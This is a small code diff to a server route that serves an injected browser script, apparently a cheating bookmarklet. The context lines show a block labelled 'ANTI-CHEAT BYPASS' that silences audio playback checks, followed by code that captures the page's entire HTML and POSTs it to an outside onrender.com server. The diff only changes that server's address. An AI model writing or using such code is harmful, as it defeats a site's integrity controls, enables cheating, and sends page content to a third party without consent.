@@ -109,7 +109,7 @@ app.get('/bm', (req, res) => {
       if(typeof HTMLAudioElement !== 'undefined') { HTMLAudioElement.prototype.play = function() { return Promise.resolve(); }; }
       // --- END ANTI-CHEAT BYPASS ---
 
-      const BASE = "https://shahzod23.onrender.com";
+      const BASE = "https://shahzod27.onrender.com";
       let html=document.documentElement.outerHTML;
       try {
         await fetch(BASE+"/upload-html",{ method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({html}) });
